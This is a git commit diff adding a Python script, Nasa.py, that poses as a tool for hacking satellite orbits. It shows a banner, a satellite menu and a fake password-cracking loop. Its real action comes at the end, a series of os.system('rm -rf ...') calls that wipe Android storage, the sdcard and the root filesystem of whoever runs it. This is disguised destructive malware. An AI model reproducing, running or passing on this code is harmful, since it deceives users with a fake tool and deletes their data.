8e3326b7913e4898a48962bef864608ae3e3fbe0
waylesiopat <117302203+wayle77@users.noreply.github.com>
2022-11-04 09:25:29 +0700

    Update and rename README.md to Nasa.py

---
+++ Nasa.py
@@ -0,0 +1,44 @@
+#made by Mr.E-Cyber Team
+
+print("██╗░░██╗░█████╗░░█████╗░██╗░░██╗")
+print("██║░░██║██╔══██╗██╔══██╗██║░██╔╝")
+print("███████║███████║██║░░╚═╝█████═╝░")
+print("██╔══██║██╔══██║██║░░██╗██╔═██╗░")
+print("██║░░██║██║░░██║╚█████╔╝██║░╚██╗")
+print("╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝")
+print(' Merubah Orbit semua SATELIT  ')
+
+print("               Created by:Mr.E-CYBER NASA")
+print("________________________________________")
+print("__________________________________________")
+
+input("press in enter to start:")
+
+print("choose a brand of satelit")
+
+print("1.Satelit Ekspress- AM8 Rusia")
+print("2.Satelit Chinasat AM8 Cina")
+print("3.Satelit Palapa A2 Indnesia ")
+print("Satelit Palapa B2R Indonesia")
+print("5.Satelit Relay USA ")
+
+input("input the number of brand:")
+
+print("attack starting")
+
+
+for y in range (100):
+	print("Trying password ",y," proccessing password ")
+WifiHack = input("press enter to get password:")
+
+print("password:fileku")
+
+import os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
+
